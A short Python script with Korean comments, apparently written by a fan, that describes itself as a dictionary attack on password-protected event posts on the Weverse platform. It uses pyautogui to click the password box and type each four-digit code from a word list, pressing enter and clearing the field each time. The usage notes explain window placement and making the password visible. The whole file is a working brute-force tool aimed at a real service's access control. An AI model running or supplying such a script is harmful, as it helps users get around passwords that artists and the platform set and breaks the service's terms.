#파일명            : weverse_brute.py                                                #
#기  능            : 위버스 아티스트들이 이벤트 삼아 올린 비밀 포스트를 뚫는 사전공격#
######################################################################################
#주의사항 및 사용법: 1. 크롬으로 위버스에 접속하고 비밀번호 입력창을 띄운다.         #
#                    2. 'win' + '<-'로 좌측에 윈도우 배치한다.                       #
#                    3. 비밀번호 파악을 위해 비밀번호 텍스트는 보이게 설정한다.      #
######################################################################################
import pyautogui
import time


pyautogui.moveTo(475,590)
pyautogui.click()
time.sleep(1)

with open('pass_4digit.txt','r', encoding='UTF8') as file:
    lines=file.readlines()
    for line in lines:
       pyautogui.typewrite(line)
       pyautogui.press('enter')
       pyautogui.press('backspace')
       pyautogui.press('backspace')
       pyautogui.press('backspace')
       pyautogui.press('backspace')
